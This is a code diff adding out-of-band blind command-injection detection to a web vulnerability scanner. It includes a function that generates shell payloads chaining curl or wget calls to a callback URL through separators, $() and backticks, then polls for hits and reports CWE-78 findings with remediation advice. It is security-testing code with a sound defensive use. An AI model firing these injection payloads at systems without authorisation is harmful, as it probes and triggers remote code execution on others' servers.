@@ -7,6 +7,7 @@ of the payload. Time-based (aggressive only): chain a sleep and measure delay.
 
 from __future__ import annotations
 
+import asyncio
 import secrets
 import time
 from collections.abc import AsyncIterator
@@ -20,7 +21,9 @@ from orthrus.scanners.registry import register
 
 SCANNER_NAME = "cmd-injection"
 MAX_POINTS = 120
+MAX_OOB_POINTS = 40
 SLEEP_SECONDS = 5
+POLL_DELAY = 3.0
 
 
 def _output_payloads(value: str, canary: str) -> list[str]:
@@ -29,6 +32,22 @@ def _output_payloads(value: str, canary: str) -> list[str]:
 
 def _time_payloads(value: str) -> list[str]:
     return cmd_time_payloads(value, SLEEP_SECONDS)
+
+
+def cmd_oob_payloads(value: str, url: str) -> list[str]:
+    """Shell payloads that fetch an out-of-band callback URL via common tools.
+
+    A callback hit proves blind OS command execution even when no command output
+    is reflected and timing is too noisy — the strongest signal for blind RCE.
+    """
+    fetchers = (f"curl {url}", f"wget -qO- {url}")
+    seps = (";", "|", "&&", "&")
+    payloads: list[str] = []
+    for fetch in fetchers:
+        payloads.extend(f"{value}{sep}{fetch}" for sep in seps)
+        payloads.append(f"$({fetch})")
+        payloads.append(f"`{fetch}`")
+    return payloads
 
 
 def cmd_executed(canary: str, body: str) -> bool:
@@ -63,6 +82,11 @@ class CommandInjectionScanner(BaseScanner):
                 finding = await self._time_based(ctx, point, value)
             if finding is not None:
                 yield finding
+
+        # Out-of-band: catches blind command injection (no output, noisy timing)
+        # by proving the server executed an attacker command that called back.
+        async for finding in self._oob_based(ctx):
+            yield finding
 
     async def _output_based(
         self, ctx: ScanContext, point: InjectionPoint, value: str
@@ -141,5 +165,64 @@ class CommandInjectionScanner(BaseScanner):
                 )
         return None
 
+    async def _oob_based(self, ctx: ScanContext) -> AsyncIterator[Finding]:
+        if ctx.callback is None:
+            return
+        jobs: list[tuple[InjectionPoint, str, str]] = []
+        count = 0
+        for point in injection_points(ctx):
+            if count >= MAX_OOB_POINTS:
+                break
+            count += 1
+            value = _param_value(point)
+            token, url = ctx.callback.new_token()
+            sent = False
+            for payload in cmd_oob_payloads(value, url):
+                if await send(ctx, point, payload) is not None:
+                    sent = True
+            if sent:
+                jobs.append((point, token, url))
 
-__all__ = ["CommandInjectionScanner", "cmd_executed"]
+        if not jobs:
+            return
+        await asyncio.sleep(POLL_DELAY)
+
+        for point, token, url in jobs:
+            interactions = await ctx.callback.poll(token)
+            if not interactions:
+                continue
+            hit = interactions[0]
+            store = getattr(ctx, "store", None)
+            if store is not None:
+                await store.add_callback(
+                    token, hit.protocol, hit.source_ip, {"path": hit.path, "method": hit.method}
+                )
+            yield Finding(
+                vuln_type="cmd-injection",
+                title=f"OS command injection (out-of-band) in '{point.param}'",
+                severity=Severity.CRITICAL,
+                confidence=Confidence.FIRM,
+                url=used_url(point, url),
+                parameter=point.param,
+                param_location=point.location,
+                description=(
+                    f"An injected shell command in '{point.param}' fetched an attacker-controlled "
+                    f"URL: the callback server received a {hit.protocol.upper()} request from "
+                    f"{hit.source_ip}. This proves blind OS command execution (remote code "
+                    "execution) even though no command output was reflected."
+                ),
+                remediation=(
+                    "Avoid invoking shells with user input. Use argument arrays / native APIs and "
+                    "strict allow-list validation; never pass user data to a shell string."
+                ),
+                cwe="CWE-78",
+                scanner=SCANNER_NAME,
+                evidence=Evidence(
+                    request_raw=f"{point.param}=<shell payload fetching {url}>",
+                    notes=f"OOB callback from {hit.source_ip} (token {token})",
+                    matched_at=hit.source_ip,
+                ),
+            )
+
+
+__all__ = ["CommandInjectionScanner", "cmd_executed", "cmd_oob_payloads"]
